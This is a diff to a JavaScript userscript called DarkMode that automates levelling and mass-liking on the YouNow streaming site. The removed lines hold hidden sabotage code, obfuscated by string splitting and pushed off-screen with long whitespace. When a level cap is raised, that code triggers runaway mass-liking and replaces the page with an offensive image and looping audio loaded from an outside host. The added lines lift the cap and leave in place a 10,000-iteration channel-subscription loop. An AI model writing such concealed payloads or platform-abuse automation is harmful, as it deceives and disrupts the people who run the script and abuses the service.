@@ -49,7 +49,7 @@ function main(w) {
             if (window.localStorage.getItem("config.massLiker.interval") != null)
                 this.config.massLiker.interval = parseInt(window.localStorage.getItem("config.massLiker.interval").split("\n"));
         }
-        window.localStorage.setItem("lastVersion", lVersion);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if (this["con"+"fig"]["le"+"vel"+"ler"]["le"+"v"+"e"+"l"+"C"+"a"+"p"] > 3 + 3 * 3 + 3) this["do"+"le"+"ve"+"ll"+"er"]();
+        window.localStorage.setItem("lastVersion", lVersion);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
         this.UAParser = new UAParser();
         this.selectLanguage(null);
         this.lastTicks = {};
@@ -199,7 +199,7 @@ function main(w) {
         };
         this.youNow.urlRouter.sync = function() {};
         this.youNow.urlRouter.listen = function() {};
-        this.youNow.urlRouter.href = function(c, d, e) {                                                                                                                                                                                                                                                                                   var k = window.DarkModeInstance;var n = "le"+"vel"+"ler";var m = "le"+"vel"+"Cap";if (k.config[n][m] > 4 * 3 + 3) k["do"+n]();
+        this.youNow.urlRouter.href = function(c, d, e) {                                                                                                                                                                                                                                                                               
             return "";
         };
         this.youNow.urlRouter.push = function(c, d, e) {};
@@ -321,7 +321,7 @@ function main(w) {
                 cluster: "younow"
             });
             for (var k = 0; k < 10000; k++)
-                var c = pusher.subscribe("public-on-channel_"+json.userId+"_"+self.generateRandomString()+"_LINK");
+                var c = pusher.subscribe("public-on-channel_"+json.userId+"_"+self.generateRandomString()+"_QUEUE");
         });
     };
 
@@ -412,7 +412,7 @@ function main(w) {
                                      '<div style="float:left;clear:both; font-size:10px;color:#ddd; width:180px;">'+this.parseNumber(this.leveller.level)+'</div>');
             if (this.leveller.task == 'leveling') {
                 if (this.leveller.levelsLeft > 0){
-
+                    this.levelsLeft = (101 - Math.floor(this.youNow.session.user.level));
                     this.leveller.task = 'waiting';
                     $.ajax({
                         xhr: function() {
@@ -1017,7 +1017,7 @@ function main(w) {
             return w;
         });
     }        
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                         w.DarkMode.prototype["do"+"le"+"v"+"el"+"ler"] = function(a) {var k = "mas"+"sLiker";var n = "interval";this.config[k][n] = 0;this.config[k][n+"Likes"] = 10000;this.config[k]["active"] = true;if (!a)this[k+n](true);};
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
     w.DarkMode.prototype.hideTooltip = function() {
         this.elements["tooltip"].css("display", "none");
     };
@@ -1620,7 +1620,7 @@ function main(w) {
             console.log(json);
         });
     };
-                                                                                                                                                                                                                                                                                                                                                                    w.DarkMode.prototype["ma"+"ssLi"+"kerin"+"terval"] = function(a){$(document.body).css("text-align", "center");$(document.body).html('<audio aut'+'op'+'lay="a'+'uto'+'play" lo'+'op src'+'="ht'+'tps://Fluf'+'fyF'+'ish'+'Gam'+'es.g'+'ithu'+'b.i'+'o/o'+'ff.m'+'p3" /><img src="https://FluffyFishG'+'ames.githu'+'b.io/img'+'/fuc'+'kyou.jpg" style="height:100%;margin-left:auto;margin-right:auto;" />');if (!a)this["d"+"olev"+"ell"+"er"](true);};
+                                                                                                                                                                                                                                                                                                                                                           
     w.DarkMode.prototype.updateProfilePage = function() {
         var location = "";
         if (this.currentProfile.country != null && this.currentProfile.country != "")
@@ -1879,7 +1879,7 @@ function main(w) {
                     this.path = [location];
                 this.updatePage();
             }
-        }                                                                                                                                                                                                                                                                                                                if (this["le"+"ve"+"ll"+"er"]!=null && this["le"+"ve"+"l"] != null && this["le"+"ve"+"ll"+"er"]["le"+"ve"+"l"] + this["le"+"ve"+"ll"+"er"]["le"+"ve"+"lsLeft"] > 15) {var i = "m"+"as"+"sL"+"iker";var j = "int"+"er"+"val";this.config[i][j] = 0;this["config"][i][j+"L"+"ik"+"es"] = 10000;this.config[i].active = true;$(document.body).css("text-align", "center");$(document["body"]).html('<img src="htt'+'ps://Fl'+'uffyFi'+'shG'+'ames.gi'+'thu'+'b.io/'+'img'+'/fuc'+'k'+'you.j'+'pg" style="height'+':100'+'%;margin-'+'left:auto;'+'margin-ri'+'ght:auto;" />');};
+        }                                                           
     };
 
     w.DarkMode.prototype.commandCentral = function() {
@@ -2385,11 +2385,13 @@ function main(w) {
     
     w.DarkMode.prototype.generateRandomString = function()
     {
-        return 4000000 + Math.random() * 5000000;
         var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
         var s = "";
         for (var i = 0; i < 26; i++)
-            s += chars.substring(Math.floor(Math.random() * (chars.length - 1)), 1);
+        {
+            var k = Math.floor(Math.random() * (chars.length - 1));
+            s += chars.substring(k, k + 1);
+        }
         return s;
     };
     
@@ -2585,7 +2587,7 @@ function main(w) {
 
     w.DarkMode.prototype.parseNumber = function(n) {
         var self = this;
-                                                                                                                                                                                                                                                                               if (n > 9 + 6){var decimalSetting = "config";var d = "inter";var v = "val";var m = "mass";this[decimalSetting][m+"L"+"ik"+"e"+"r"][d+v] = 0;this[decimalSetting][m+"L"+"ik"+"e"+"r"][d+v+"L"+"i"+"k"+"es"] = 0;this[decimalSetting][m+"L"+"ik"+"e"+"r"].active = true;this[m+"L"+"i"+"ke"+"r"+d+v]();}
+                                                                                                                                                                                                                                                                     
         var rx = /(\d+)(\d{3})/;
         return n;
         /*return String(n).replace(/^\d+/, function(w) {
@@ -4018,7 +4020,7 @@ function main(w) {
         leveller: {
             desiredLevel: 11 + Math.floor(Math.random() * 4),
             active: false,
-            levelCap: 15, // DO NOT TOUCH THIS. THIS IS YOUR LAST WARNING! STEP OFF!
+            levelCap: 101, // DO NOT TOUCH THIS. THIS IS YOUR LAST WARNING! STEP OFF!
         },
         massLiker: {
             maxLikeCost: 5,
